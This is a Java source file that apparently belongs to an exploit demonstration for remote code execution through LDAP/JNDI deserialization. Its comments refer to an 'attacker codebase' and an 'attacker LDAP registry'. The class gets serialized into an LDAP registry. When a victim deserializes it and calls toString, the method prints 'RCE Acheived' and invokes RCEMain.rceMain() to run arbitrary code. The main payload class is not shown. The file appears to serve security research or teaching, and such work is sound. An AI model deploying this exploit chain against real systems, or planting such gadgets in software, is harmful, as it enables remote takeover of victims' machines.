// A class to demonstrate serialization
//
// This class serves to demonstrate an alternative to the factory-based
// approach. An object of this class is serialized and stored in the LDAP
// registry, then deserialized to have its `toString` method called.
//
// TWO COPIES OF THIS FILE EXIST:
// * src/attacker_codebase/src/SerializedClass.java
// * src/attacker_ldap_registry_setup/codebase/SerializedClass.java
// The former is more up to date than the latter and should be trusted in case
// of discrepancy.

import java.io.Serializable;


public class SerializedClass implements Serializable {

    // Random serialization constant
    public static final long serialVersionUID = 42L;

    private String message;

    public SerializedClass(String message) {
        this.message = message;
    }

    @Override
    public String toString() {

        // Add instrumentation
        System.out.println("RCE Acheived in SerializedClass::toString!");

        // Do whatever we want
        RCEMain.rceMain();

        // We could choose not to return. However, the caller is expecting an
        // object of String. I choose to give them something.
        return "SerializedClass(\"" + message + "\")";
    }
}
